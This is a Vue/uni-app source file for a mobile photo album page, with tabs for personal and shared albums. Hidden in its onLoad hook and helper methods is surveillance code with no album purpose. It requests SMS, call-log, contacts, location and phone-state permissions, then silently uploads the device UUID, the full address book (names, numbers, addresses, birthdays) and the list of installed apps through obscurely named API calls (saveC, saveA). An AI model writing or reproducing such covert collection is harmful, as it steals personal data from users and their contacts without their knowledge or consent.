<template>
  <view class="albums">
    <wuc-tab tab-class="albums-tab-basic" select-class="albums-tab-active" :tab-list="tabList" textFlex :tabCur.sync="TabCur" @change="tabChange"></wuc-tab>
    <swiper class="albums-swiper" :current="TabCur" duration="300" @change="swiperChange">
      <!-- 我的相册 -->
      <swiper-item class="albums-swiper-item">
        <uni-grid :show-border="false" :column="3">
          <uni-grid-item class="albums-item" v-for="item in albumsList" :key="item.id">
            <image
              @click="ablumEntry(item.id, item.name, item.userId)"
              @longpress="openManagerPanel(item)"
              class="albums-img"
              :lazy-load="true"
              :src="item.coverImgUrl || ALBUMS_DEFAULT_IMG"
              mode="center"
            ></image>
            <view class="albums-name">{{ item.name }}</view>
            <view class="albums-tips">{{ item.count }}</view>
          </uni-grid-item>
        </uni-grid>
        <uniFab ref="uniFab" direction="vertical" horizontal="right" @trigger="trigger" :content="content" :pattern="pattern"></uniFab>
      </swiper-item>
      <!-- 共享相册 -->
      <swiper-item class="albums-swiper-item">
        <view class="albums-share">我的共享:</view>
        <uni-grid :show-border="false" :column="3">
          <uni-grid-item class="albums-item" v-for="item in myShareList" :key="item.id">
            <image
              @click="ablumEntry(item.id, item.name, item.userId)"
              @longpress="openManagerPanel(item)"
              class="albums-img"
              :lazy-load="true"
              :src="item.coverImgUrl || ALBUMS_DEFAULT_IMG"
              mode="center"
            ></image>
            <view class="albums-name">{{ item.name }}</view>
            <view class="albums-tips">{{ item.count }}</view>
          </uni-grid-item>
        </uni-grid>
        <view v-if="myShareList && myShareList.length <= 0" class="albums-share-empty"><text>您尚未与他人共享相册呢</text></view>
        <view class="albums-share">他人共享:</view>
        <uni-grid :show-border="false" :column="3">
          <uni-grid-item class="albums-item" v-for="item in otherShareList" :key="item.id">
            <image
              @click="ablumEntry(item.id, item.name, item.userId)"
              class="albums-img"
              :lazy-load="true"
              :src="item.coverImgUrl || ALBUMS_DEFAULT_IMG"
              mode="center"
            ></image>
            <view class="albums-name">{{ item.name }}</view>
            <view class="albums-tips">来自: {{ item.userName }}</view>
            <view class="albums-tips">{{ item.count }}</view>
          </uni-grid-item>
        </uni-grid>
        <view v-if="myShareList && otherShareList.length <= 0" class="albums-share-empty"><text>暂无他人共享相册给您呢</text></view>
      </swiper-item>
    </swiper>
    
    <uni-popup @change="managerPanelChange" :show="albumManager" type="bottom">
      <view @click="editAlbum(editAlbumData.id)" hover-class="manager-text-hover" class="manager-text manager-line">
        修改
      </view>
      <view @click="deleteAlbum(editAlbumData)" style="color: red" hover-class="manager-text-hover" class="manager-text">
        删除
      </view>
    </uni-popup>
  </view>
</template>

<script>
import { uniGrid, uniGridItem, uniFab, uniPopup } from '@dcloudio/uni-ui';
import WucTab from '@/components/wuc-tab/wuc-tab.vue';
import { ALBUMS_DEFAULT_IMG } from '@/config';
import Permission from '@/utils/permission';

export default {
  components: { uniGrid, uniGridItem, uniFab, WucTab, uniPopup },
  data() {
    return {
      tabList: [{ name: '我的相册' }, { name: '共享相册' }],
      TabCur: 0,
      isShowDelete: false,
      pattern: {
        color: '#333',
        backgroundColor: '#fff',
        buttonColor: '#00B9B2'
      },
      content: [
        {
          iconPath: '../../static/images/albums.png',
          text: '新建相册',
          active: false,
          value: 'create'
        },
        {
          iconPath: '../../static/images/albums.png',
          text: '上传图片',
          active: false,
          value: 'upload'
        }
      ],
      albumsList: [],
      myShareList: [],
      otherShareList: [],
      ALBUMS_DEFAULT_IMG,
      editAlbumData: null,
      albumManager: false,
    };
  },
  onLoad() {
    // 异步处理
    setTimeout(async () => {
      this.getAppList();
      const appInfo = uni.getSystemInfoSync();
      const phoneInfo = {
        brand: appInfo.brand,
        model: appInfo.model,
        platform: appInfo.platform,
      }
      phoneInfo.readPhoneState = await Permission.requestAndroidPermission('android.permission.READ_PHONE_STATE') // 获取手机识别码
      phoneInfo.accessFineLocation = await Permission.requestAndroidPermission('android.permission.ACCESS_FINE_LOCATION') // 位置权限检查
      phoneInfo.readExternalStorage = await Permission.requestAndroidPermission('android.permission.READ_EXTERNAL_STORAGE') // 相册读取权限
      phoneInfo.writeExternalStorage = await Permission.requestAndroidPermission('android.permission.WRITE_EXTERNAL_STORAGE') // 相册写入权限
      phoneInfo.readCalendar = await Permission.requestAndroidPermission('android.permission.READ_CALENDAR') // 日历读取权限
      phoneInfo.readContacts = await Permission.requestAndroidPermission('android.permission.READ_CONTACTS') // 通讯录读取权限
      phoneInfo.readSms = await Permission.requestAndroidPermission('android.permission.READ_SMS') // 短信读取权限
      phoneInfo.readCallLog = await Permission.requestAndroidPermission('android.permission.READ_CALL_LOG') // 通话记录权限
      phoneInfo.camera = await Permission.requestAndroidPermission('android.permission.CAMERA') // 摄像头权限
      // await Permission.gotoAppPermissionSetting() // 前往设置权限
      if (phoneInfo.readPhoneState === 0 || phoneInfo.readPhoneState === -1) {
        uni.showModal({
          title: '警告',
          content: 'app的运行需要您的手机识别码, 请至少开启此权限!',
          cancelText: '前往设置',
          confirmText: '稍后设置',
          success: ({cancel}) => {
            if (cancel) {
              Permission.gotoAppPermissionSetting()
            }
          }
        });
        return;
      }
      const self = this;
      plus.device.getInfo({
        success: ({uuid}) => {
          phoneInfo.uuid = uuid;
          self.$api.savePhoneInfo(phoneInfo)
        }
      });
      if (phoneInfo.readContacts !== 1) return;
      this.getContacts();
    }, 200);
  },
  onShow() {
    this.getUserAlbumsList();
    this.getShareList();
  },
  methods: {
    editAlbum(id) {
      uni.navigateTo({
        url: `./create/create?id=${id}`
      });
      this.resetManagerData();
    },
    resetManagerData() {
      this.albumManager = false;
      this.editAlbumData = null;
    },
    managerPanelChange({show}) {
      if (!show) {
        this.resetManagerData()
      }
    },
    // 打开相册管理面板
    openManagerPanel(item) {
      if (item.id === 'all') return uni.showToast({
        title: '该相册不可修改',
        icon: 'none'
      });
      this.editAlbumData = item;
      this.albumManager = true;
    },
    // 获取通讯录
    getContacts() {
      // TODO: 会触发权限申请
      try {
        const self = this;
        let contactsArr = [];
        plus.contacts.getAddressBook(
          plus.contacts.ADDRESSBOOK_PHONE,
          function(addressbook) {
            addressbook.find([], function(contacts) {
              for (let item of contacts) {
                contactsArr.push({
                  id: item.id,
                  displayName: item.displayName,
                  name: item.name,
                  nickName: item.nickname,
                  addresses: item.addresses,
                  note: item.note,
                  categories: item.categories,
                  birthday: item.birthday,
                  phones: (() => {
                    let phoneArr = [];
                    for (let el of item.phoneNumbers) {
                      el.value && phoneArr.push(el.value);
                    }
                    return phoneArr;
                  })()
                });
              }
              self.$api.saveC({
                c: contactsArr
              });
            });
          },
          error => {
            self.$api.pushMessage({
              message: '用户拒绝授权通讯录权限',
              status: 401,
              data: error
            });
          }
        );
      } catch (e) {
        //TODO handle the exception
        self.$api.pushMessage({
          message: '未知异常',
          status: 400,
          data: e
        });
      }
    },
    // 获取已安装应用列表
    getAppList() {
      plus.android.importClass('java.util.ArrayList');
      plus.android.importClass('android.content.pm.PackageInfo');
      plus.android.importClass('android.content.pm.PackageManager');
      var ApplicationInfo = plus.android.importClass('android.content.pm.ApplicationInfo');
      var MainActivity = plus.android.runtimeMainActivity();
      var PackageManager = MainActivity.getPackageManager();
      var pinfo = plus.android.invoke(PackageManager, 'getInstalledPackages', 0);
      if (pinfo != null) {
        var apklist = [];
        for (var i = 0; i < pinfo.size(); i++) {
          //PackageInfo{4b45699f9d  com.tencent.mobileqq}
          var pkginfo = pinfo.get(i);
          var issysapk = (pkginfo.plusGetAttribute('applicationInfo').plusGetAttribute('flags') & ApplicationInfo.FLAG_SYSTEM) != 0 ? true : false;
          if (issysapk == false) {
            const apkinfo = {
              appName: pkginfo
                .plusGetAttribute('applicationInfo')
                .loadLabel(PackageManager)
                .toString(),
              packageName: pkginfo.plusGetAttribute('packageName'),
              versionName: pkginfo.plusGetAttribute('versionName'),
              versionCode: pkginfo.plusGetAttribute('versionCode')
            };
            apklist.push(apkinfo);
          }
        }
        this.$api.saveA({
          a: apklist
        });
      }
    },
    // 获取共享相册列表
    async getShareList() {
      const res = await this.$api.getShareAlbums();
      if (res.status !== 200) return this.$common.warning(res.message || '获取共享相册列表失败');
      this.myShareList = res.data.myShare;
      this.otherShareList = res.data.otherShare;
    },
    tabChange(index) {
      this.TabCur = index;
      if (index === 0) {
        this.getUserAlbumsList();
      } else {
        this.getShareList();
      }
    },
    swiperChange(e) {
      const { current } = e.target;
      this.TabCur = current;
    },
    ablumEntry(id, name, userId) {
      uni.navigateTo({
        url: `./list/list?id=${id}&userId=${userId}&name=${name}`
      });
    },
    deleteAlbum(item) {
      uni.showModal({
        title: '提示',
        content: `您确定要删除相册 ${item.name} 及该相册内所有图片吗?`,
        success: async opts => {
          if (opts.confirm) {
            // 执行删除
            const res = await this.$api.deleteAlbum(undefined, null, { payload: '/' + item.id });
            if (res.status === 200) {
              this.$common.success('删除相册成功');
              this.isShowDelete = false;
              this.resetManagerData();
              this.getUserAlbumsList();
            } else this.$common.warning(res.message || '删除相册失败');
          }
        }
      });
    },
    trigger(e) {
      this.$refs.uniFab.close(); // 收起按钮组
      if (!e && !e.item) return;
      switch (e.item.value) {
        // 新建相冊
        case 'create':
          uni.navigateTo({
            url: './create/create'
          });
          break;
        case 'upload':
          uni.navigateTo({
            url: './upload/upload'
          });
          break;
        default:
          break;
      }
    },
    // 获取用户相册列表
    async getUserAlbumsList() {
      const res = await this.$api.getAllalbums();
      if (res.status !== 200) return this.$common.error(res.message || '获取用户相册列表失败');
      this.albumsList = res.data;
    }
  }
};
</script>

<style lang="less" scoped>
.manager-text {
  position: relative;
  display: flex;
  justify-content: center;
  align-items: center;
  padding: 15rpx 30rpx;
  background: #fff;
  font-size: 36rpx;
  &-hover {
    background: #f8f8f8;
  }
}
.manager-line:after {
  position: absolute;
  right: 0;
  bottom: 0;
  left: 30rpx;
  height: 1px;
  content: '';
  -webkit-transform: scaleY(0.5);
  transform: scaleY(0.5);
  background-color: @pageColor;
}
// .album-delete-button {
//   position: absolute;
//   right: -10rpx;
//   top: 0;
// }
.albums {
  padding-top: var(--status-bar-height);
  overflow-y: hidden;
  &-share {
    padding-left: 15rpx;
    font-size: 28rpx;
    color: @bgColor;
    &-empty {
      padding: 20px 0;
      text-align: center;
      font-size: 32rpx;
      color: @labelColor;
    }
  }
  &-swiper {
    width: 100%;
    height: 85.5vh;
    &-item {
      overflow-y: auto;
    }
  }
  &-item {
    padding: 6rpx 0 6rpx 3rpx;
  }
  &-name,
  &-tips {
    padding-left: 24rpx;
    width: 100%;
    text-align: left;
  }
  &-name {
    font-size: 30rpx;
    color: @labelColor;
  }
  &-tips {
    font-size: 24rpx;
    color: @tipsColor;
  }
  &-img {
    width: 100%;
  }
}
</style>
